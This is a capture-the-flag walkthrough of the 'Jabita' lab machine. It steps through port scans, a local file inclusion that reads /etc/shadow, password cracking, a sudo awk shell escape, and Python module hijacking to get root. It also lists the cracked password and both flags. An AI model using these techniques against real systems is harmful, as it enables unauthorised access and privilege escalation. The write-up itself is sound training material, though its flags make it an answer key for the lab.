+++
title = "Jabita - Walkthrough"
date = "2026-07-07"
author = "nvru"
description = "Walkthrough for the Jabita machine."
tags = ["ctf", "walkthrough", "linux", "web", "lfi", "sudo", "python-library-hijacking", "privilege-escalation"]
draft = false
+++

![Jabita VM](/images/hmv/jabita/vm.png)

## Target Information

| Role     | IP Address    |
| -------- | ------------- |
| Attacker | `10.10.10.2`  |
| Machine  | `10.10.10.15` |

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.15 -- -oA nmap/rust
```

### Results

```text
Open 10.10.10.15:22
Open 10.10.10.15:80

[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -oA nmap/rust" on ip 10.10.10.15

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

---

## Nmap

```bash
nmap -sSCV -A -p22,80 -oA nmap/22_80 --min-rate=1000 10.10.10.15
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:
|   256 00:b0:03:d3:92:f8:a0:f9:5a:93:20:7b:f8:0a:aa:da (ECDSA)
|_  256 dd:b4:26:1d:0c:e7:38:c3:7a:2f:07:be:f8:74:3e:bc (ED25519)

80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

|_http-title: Site doesn't have a title (text/html)
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

Only two TCP ports are exposed:

- **22** - OpenSSH
- **80** - HTTP (Apache)

---

# Enumeration

## HTTP (Port 80)

Browsing to the web application revealed a very simple page with nothing immediately interesting.

![HTTP](/images/hmv/jabita/http.png)

Inspecting the page source also revealed nothing useful.

Checking for a `robots.txt` file likewise produced no results.

![No Robots](/images/hmv/jabita/no_robots.png)

---

## Directory Brute Force

Since the default web page provided no useful information, I performed directory enumeration.

A hidden **building** directory was discovered.

![Directory Brute Force](/images/hmv/jabita/dir_brute_force.png)

Inspecting the source code inside this directory revealed a parameter that appeared to load files from the server.

The first attack vector that came to mind was **Local File Inclusion (LFI)**.

- `https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html`

![Source Code](/images/hmv/jabita/building_src.png)

Testing with `/etc/passwd` confirmed the vulnerability.

![Successful LFI](/images/hmv/jabita/suc_lfi.png)

The output revealed two local users:

- `jack`
- `jaba`

It also showed that **LXD** was installed on the system.

Reference:

- https://www.geeksforgeeks.org/linux-unix/users-in-linux-system-administration/

---

### Reading Sensitive Files

After confirming the LFI vulnerability, I continued enumerating the filesystem by attempting to read interesting files.

Accessing files within the users' home directories, such as `.bash_history` and `.bashrc`, was unsuccessful, most likely because of permission restrictions.

However, requesting `/etc/shadow` through the vulnerable parameter succeeded, exposing the password hashes for the local users.

![Shadow via LFI](/images/hmv/jabita/shadow_lfi.png)

The relevant hashes were:

```text
root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
```

I attempted to crack the hashes using **John the Ripper**.

The password for **jack** was recovered successfully.

![John Cracking](/images/hmv/jabita/john_jack.png)

---

# Initial Access

Using the recovered credentials, I authenticated to the machine via SSH.

```text
jack : joaninha
```

![SSH Login](/images/hmv/jabita/suc_ssh_jack.png)

---

# Privilege Escalation

## jack → jaba

Checking the user's sudo permissions revealed the following:

```bash
sudo -l
```

![sudo -l](/images/hmv/jabita/sudo_l_jack.png)

The user **jack** could execute **awk** as **jaba** without supplying a password.

Initially I attempted to inspect `jaba`'s home directory, but I lacked the necessary permissions.

![No Permission](/images/hmv/jabita/no_perm_home.png)

Consulting both the man page and GTFOBins showed that **awk** can execute arbitrary system commands.

The following command spawns a shell as **jaba**.

```bash
sudo -u jaba /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

![AWK Exploit](/images/hmv/jabita/exp_awk_sudo_jaba.png)

---

## jaba → root

After switching to **jaba**, I located the user flag along with the user's Python history file.

Reading `.python_history` revealed the following command had previously been executed:

```bash
chmod u+s /bin/bash
```

![Python History](/images/hmv/jabita/flag_py_hist.png)

This suggested that a SUID binary might exist, so I searched the system.

```bash
find / -perm -4000 -type f 2>/dev/null
```

However, nothing unusual was found.

![No SUID](/images/hmv/jabita/find_no_suid.png)

Running `sudo -l` again revealed something far more interesting.

![sudo -l jaba](/images/hmv/jabita/sudo_l_jaba.png)

The user could execute the following script as root:

```text
/usr/bin/python3 /usr/bin/clean.py
```

Examining the script showed that it imported a custom Python module named `wild`.

To locate the module I searched the filesystem.

```bash
find / -type f -name wild.py -ls 2>/dev/null
```

Fortunately, the located `wild.py` file was writable by all users.

I replaced its contents with the following:

```python
import os
os.system("bash -i")
```

Running the allowed sudo command then executed the malicious module as **root**, resulting in a root shell.

![Root Shell](/images/hmv/jabita/su_root.png)

---

# Credentials

## SSH

```text
jack : joaninha
```

---

# Flags

```text
user flag : 2e0942f09699435811c1be613cbc7a39
root flag : f4bb4cce1d4ed06fc77ad84ccf70d3fe
```
